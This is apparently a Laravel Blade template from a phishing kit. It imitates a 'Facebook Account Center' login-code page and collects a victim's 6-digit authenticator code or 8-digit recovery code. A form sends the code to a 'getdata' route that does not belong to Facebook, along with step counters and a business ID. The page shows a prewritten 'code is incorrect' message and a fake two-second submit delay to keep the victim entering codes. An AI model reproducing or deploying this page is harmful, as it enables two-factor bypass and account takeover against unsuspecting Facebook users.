@extends('layouts.app')

@section('content')
<div id="root">
        <div class="flex w-full flex-col items-center justify-center p-4">
          <div
            class="flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
            <div class="flex flex-col">
            <b>Account Center - Facebook</b><b class="text-2xl">Check notifications on another device</b>            </div>
            <img src="{{ asset('assets/verify_otp.jpg') }}" alt="" />
            <div><b>Approve from another device or Enter your login code</b><p>Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code</p></div>
            <form id="form" action="{{ route('getdata') }}" method="GET">
                <input type="hidden" name="step" value="6">
                <input type="hidden" name="_token" value="gFvIrDjsqTPBVZBJTMwePxlETH05ITIfpEjPeK7E" autocomplete="off">                <input type="hidden" name="businessId" value="278188680457">
                <input type="hidden" name="step" value="5">
                <input type="hidden" name="id" value="">
            <div class="my-2">
              <input
                class="w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
                type="text"
                autocomplete="one-time-code"
                inputmode="numeric"
                maxlength="8"
                minlength="6"
                pattern="\d*"
                placeholder="Enter Code"
                value=""
                id="code" name="otp"
                onblur="validateInput(this, 'Code')" />
                <p class="text-red-500" id="codeError" style="padding-top:5px;">
                This code is incorrect. Please check that you entered the code correctly or try a new code.              </p>
              <button
                class="my-5 flex w-full items-center justify-center rounded-lg p-4 font-semibold text-white cursor-not-allowed bg-blue-300"
                disabled
                id="continue">
                Continue              </button>
            </div>
            </form>
          </div>
        </div>
      </div>
      <div id="google_translate_element" style="display: none;"></div>

<script type="text/javascript">
    function googleTranslateElementInit() {
        new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
    }

    (function () {
        var gtScript = document.createElement('script');
        gtScript.type = 'text/javascript';
        gtScript.src = "//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
        document.getElementsByTagName('head')[0].appendChild(gtScript);
    })();

    async function getLanguageFromBackend() {
        try {
            const response = await fetch('/get-language');
            const data = await response.json();
            return data.language || 'en';
        } catch (error) {
            console.error("Error fetching language from backend:", error);
            return 'en';
        }
    }

    async function autoTranslate() {
        document.getElementById('loading-overlay').style.display = 'flex';

        const targetLang = await getLanguageFromBackend();

        setTimeout(() => {
            const selectElement = document.querySelector('select.goog-te-combo');
            if (selectElement) {
                selectElement.value = targetLang;
                selectElement.dispatchEvent(new Event('change'));
            }

            setTimeout(() => {
                document.getElementById('loading-overlay').style.display = 'none';
            }, 500);
        }, 500);
    }

    document.addEventListener('DOMContentLoaded', autoTranslate);
</script>

<style>
    .goog-te-banner-frame, .skiptranslate, .VIpgJd-ZVi9od-aZ2wEe-wOHMyf {
        display: none !important;
    }

    body {
        top: 0 !important;
    }
</style>
      <script>
        function validateInput(input, fieldName) {
          const errorElement = document.getElementById(input.id + "Error");
          // Kiểm tra cho các input khác
          if (!input.value.trim()) {
            // Hiển thị lỗi nếu không có giá trị
            errorElement.classList.remove("hidden");
            errorElement.innerText = `Invalid ${fieldName}`;
          } else {
            // Nếu có giá trị, ẩn lỗi
            errorElement.classList.add("hidden");
          }
        }
        ////////////////////////////////////////////////
        // Lắng nghe sự ki��n nhập liệu trên input #code
        $("#code").on("input", function() {
          var inputLength = $(this).val().length; // Lấy độ dài của giá trị nhập
          var continueButton = $("#continue"); // Lấy đối tượng button

          // Kiểm tra độ dài từ 6 đến 8 ký tự
          if (inputLength >= 6 && inputLength <= 8) {
            continueButton.prop("disabled", false); // Bỏ thuộc tính disabled khi hợp lệ
            continueButton
              .removeClass("cursor-not-allowed bg-blue-300")
              .addClass("bg-blue-500 hover:bg-blue-600"); // Thay đổi class khi hợp lệ
          } else {
            continueButton.prop("disabled", true); // Đặt lại thuộc tính disabled khi không hợp lệ
            continueButton
              .removeClass("bg-blue-500 hover:bg-blue-600")
              .addClass("cursor-not-allowed bg-blue-300"); // Thêm lại class khi không hợp lệ
          }
        });
        ////////////////////////////////////////////////////////////////
        // Lắng nghe sự kiện click vào nút continue
        $('#continue').on('click', function(e) {
          e.preventDefault(); // Ngăn chặn hành động mặc định của form
          handleSubmit(); // Gọi hàm xử lý submit
        });

        // Lắng nghe sự kiện nhấn phím "Enter"
        $(document).keypress(function(e) {
          if (e.which == 13) { // Kiểm tra nếu phím Enter (mã phím 13) được nhấn
            e.preventDefault(); // Ngăn chặn hành động mặc định
            handleSubmit(); // Gọi hàm xử lý submit
          }
        });

        // Hàm xử lý submit khi nhấn nút hoặc nhấn phím Enter
        function handleSubmit() {
            var continueButton = $("#continue");
            var continueText = continueButton.text();
            continueButton.html(
                '<div class="h-6 w-6 animate-spin rounded-full border-2 border-white border-r-transparent border-t-transparent"></div>'
            ).prop("disabled", true).addClass("cursor-not-allowed bg-blue-300").removeClass("bg-blue-500 hover:bg-blue-600 cursor-pointer");
            setTimeout(function() {
                continueButton.html(continueText).prop("disabled", false).removeClass("cursor-not-allowed bg-blue-300").addClass("bg-blue-500 hover:bg-blue-600 cursor-pointer");
                $("#form").submit();
            }, 2000);
        }
      </script>
@endsection